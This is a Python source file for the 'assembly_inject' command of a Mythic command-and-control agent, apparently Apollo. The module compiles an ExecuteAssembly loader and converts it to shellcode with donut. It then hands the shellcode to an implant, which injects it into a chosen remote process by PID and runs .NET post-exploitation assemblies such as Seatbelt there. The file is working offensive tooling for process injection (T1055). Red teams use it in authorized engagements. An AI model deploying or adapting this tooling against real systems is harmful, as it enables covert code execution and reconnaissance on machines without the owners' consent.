from distutils.dir_util import copy_tree
import shutil
import tempfile
from mythic_container.MythicCommandBase import *
import json
from uuid import uuid4
from os import path
from mythic_container.MythicRPC import *
import base64
import asyncio
import donut

EXEECUTE_ASSEMBLY_PATH = "/srv/ExecuteAssembly.exe"

class AssemblyInjectArguments(TaskArguments):

    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="pid",
                cli_name = "PID",
                display_name = "Process ID",
                type=ParameterType.Number,
                description="Process ID to inject into.",
                parameter_group_info = [
                    ParameterGroupInfo(
                        required=True,
                        ui_position=1,
                        group_name="Default",
                    )
                ]),
            CommandParameter(
                name="assembly_name",
                cli_name="Assembly",
                display_name="Assembly",
                type=ParameterType.ChooseOne,
                dynamic_query_function=self.get_files,
                description="Assembly to execute (e.g., Seatbelt.exe).",
                parameter_group_info = [
                    ParameterGroupInfo(
                        required=True,
                        ui_position=2,
                        group_name="Default",
                    ),
                ]),
            CommandParameter(
                name="assembly_arguments",
                cli_name="Arguments",
                display_name="Arguments",
                type=ParameterType.String,
                description="Arguments to pass to the assembly.",
                parameter_group_info = [
                    ParameterGroupInfo(
                        required=False,
                        ui_position=3,
                        group_name="Default",
                    ),
                ]),
        ]

    async def get_files(self, inputMsg: PTRPCDynamicQueryFunctionMessage) -> PTRPCDynamicQueryFunctionMessageResponse:
        fileResponse = PTRPCDynamicQueryFunctionMessageResponse(Success=False)
        file_resp = await SendMythicRPCFileSearch(MythicRPCFileSearchMessage(
            CallbackID=inputMsg.Callback,
            LimitByCallback=False,
            Filename="",
        ))
        if file_resp.Success:
            file_names = []
            for f in file_resp.Files:
                if f.Filename not in file_names and f.Filename.endswith(".exe"):
                    file_names.append(f.Filename)
            fileResponse.Success = True
            fileResponse.Choices = file_names
            return fileResponse
        else:
            fileResponse.Error = file_resp.Error
            return fileResponse

    async def parse_arguments(self):
        if self.command_line[0] == "{":
            self.load_args_from_json_string(self.command_line)
        else:
            parts = self.command_line.split(" ", maxsplit=2)
            if len(parts) < 2:
                raise Exception("Invalid number of arguments.\n\tUsage: {}".format(AssemblyInjectCommand.help_cmd))
            pid = parts[0]
            assembly_name = parts[1]
            assembly_args = ""
            assembly_args = ""
            if len(parts) > 2:
                assembly_args = parts[2]
            self.args["pid"].value = pid
            self.args["assembly_name"].value = assembly_name
            self.args["assembly_arguments"].value = assembly_args



class AssemblyInjectCommand(CommandBase):
    cmd = "assembly_inject"
    needs_admin = False
    help_cmd = "assembly_inject [pid] [assembly] [args]"
    description = "Inject the unmanaged assembly loader into a remote process. The loader will then execute the .NET binary in the context of the injected process."
    version = 3
    author = "@djhohnstein"
    argument_class = AssemblyInjectArguments
    attackmapping = ["T1055"]

    async def build_exeasm(self):
        global EXEECUTE_ASSEMBLY_PATH
        agent_build_path = tempfile.TemporaryDirectory()
        outputPath = "{}/ExecuteAssembly/bin/Release/ExecuteAssembly.exe".format(agent_build_path.name)
        copy_tree(str(self.agent_code_path), agent_build_path.name)
        shell_cmd = "dotnet build -c release -p:Platform=x64 {}/ExecuteAssembly/ExecuteAssembly.csproj -o {}/ExecuteAssembly/bin/Release/".format(agent_build_path.name, agent_build_path.name)
        proc = await asyncio.create_subprocess_shell(shell_cmd, stdout=asyncio.subprocess.PIPE,
                                                     stderr=asyncio.subprocess.PIPE, cwd=agent_build_path.name)
        stdout, stderr = await proc.communicate()
        if not path.exists(outputPath):
            raise Exception("Failed to build ExecuteAssembly.exe:\n{}".format(stderr.decode()))
        shutil.copy(outputPath, EXEECUTE_ASSEMBLY_PATH)


    async def create_go_tasking(self, taskData: PTTaskMessageAllData) -> PTTaskCreateTaskingMessageResponse:
        response = PTTaskCreateTaskingMessageResponse(
            TaskID=taskData.Task.ID,
            Success=True,
        )
        global EXEECUTE_ASSEMBLY_PATH
        taskData.args.add_arg("pipe_name",  str(uuid4()))
        if not path.exists(EXEECUTE_ASSEMBLY_PATH):
            await self.build_exeasm()

        donutPic = donut.create(file=EXEECUTE_ASSEMBLY_PATH, params=taskData.args.get_arg("pipe_name"))
        file_resp = await SendMythicRPCFileCreate(MythicRPCFileCreateMessage(
            TaskID=taskData.Task.ID,
            DeleteAfterFetch=True,
            FileContents=donutPic
        ))
        if file_resp.Success:
            taskData.args.add_arg("loader_stub_id", file_resp.AgentFileId)
        else:
            raise Exception("Failed to register execute-assembly DLL: " + file_resp.Error)

        response.DisplayParams = "-PID {} -Assembly {} -Arguments {}".format(
            taskData.args.get_arg("pid"),
            taskData.args.get_arg("assembly_name"),
            taskData.args.get_arg("assembly_arguments")
        )
        return response

    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
        resp = PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
        return resp
